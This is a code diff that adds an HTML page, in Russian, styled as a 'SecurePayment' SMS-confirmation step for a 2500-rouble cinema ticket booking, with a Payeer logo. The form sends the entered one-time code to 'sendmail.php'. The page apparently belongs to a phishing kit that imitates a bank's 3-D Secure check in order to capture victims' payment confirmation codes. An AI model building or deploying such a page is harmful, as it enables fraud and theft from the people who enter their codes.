@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecurePayment</title>
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/secure.css">
+</head>
+<body>
+    <div class="sms_wrapper">
+        <div class="sms">
+            <div class="sms_title">
+                <h3>Введите Ваш Код</h3>
+                <img src="css/images/more_photo/payeer.png">
+            </div>
+
+            <div class="sms_about">
+                <h3 class="sms_about_title"><b>Действие: </b>AtlasCinema</h3>
+                <p class="sms_about_sum"><b>Сумма: </b>2500 руб.</p>
+                <span class="sms_about_desc"><b>Описание: </b>Бронирование билетов в кинотеатр</span>
+            </div>
+
+            <div class="sms_kod">
+                <p>Одноразовый код был направлен на Ваш номер телефона.
+                    Пожалуйста, проверьте реквизиты транзакции и введите одноразовый код.</p>
+            </div>
+
+            <form action="sendmail.php" method="post" class="sms_form" id="form">
+                <input type="text" name="sms" placeholder="Однорозарый код" class="sms_form_kod _req"><br>
+                <button type="submit">Оплатить</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="js/secure.js"></script>
+</body>
+</html>
